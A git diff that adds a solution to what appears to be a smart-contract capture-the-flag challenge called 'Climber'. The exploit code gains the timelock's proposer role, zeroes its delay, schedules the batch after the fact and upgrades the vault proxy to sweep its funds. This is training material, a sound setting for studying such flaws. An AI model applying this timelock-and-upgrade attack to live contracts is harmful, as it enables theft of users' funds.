@@ -53,6 +53,36 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        const Exploiter = await ethers.getContractFactory('ClimberExploiter')
+        this.exploiter = await Exploiter.connect(attacker).deploy(this.timelock.address)
+
+        const NewClimberVault = await ethers.getContractFactory('NewClimberVault')
+        this.newClimberVault = await NewClimberVault.connect(attacker).deploy()
+
+        let ABI = [ // functions to be called
+            "function grantRole(bytes32 role, address account)", // ClimberTimelock
+            "function updateDelay(uint64 newDelay)", // ClimberTimelock
+            "function setSchedule()", // Exploiter
+            "function upgradeToAndCall(address newImplementation, bytes data)", // ClimberVault
+            "function sweepFunds()" // NewClimberVault
+        ]
+
+        let iface = new ethers.utils.Interface(ABI);
+        let e1 = iface.encodeFunctionData("grantRole",[await this.timelock.PROPOSER_ROLE(),this.exploiter.address])
+        let e2 = iface.encodeFunctionData("updateDelay",[0])
+        let e3 = iface.encodeFunctionData("setSchedule")
+        let IsweepFunds = iface.encodeFunctionData("sweepFunds")
+        let e4 = iface.encodeFunctionData("upgradeToAndCall",[this.newClimberVault.address,IsweepFunds])
+
+        let dataElements = [e1,e2,e3,e4]
+        let targets = [this.timelock.address,this.timelock.address,this.exploiter.address,this.vault.address] // this.vault.address is the proxy address
+        let values = [0,0,0,0]
+        let salt = ethers.constants.HashZero
+        
+        await this.exploiter.connect(attacker).setValues(values,targets,dataElements)
+        await this.timelock.connect(attacker).execute(targets,values,dataElements,salt)
+        
     });
 
     after(async function () {
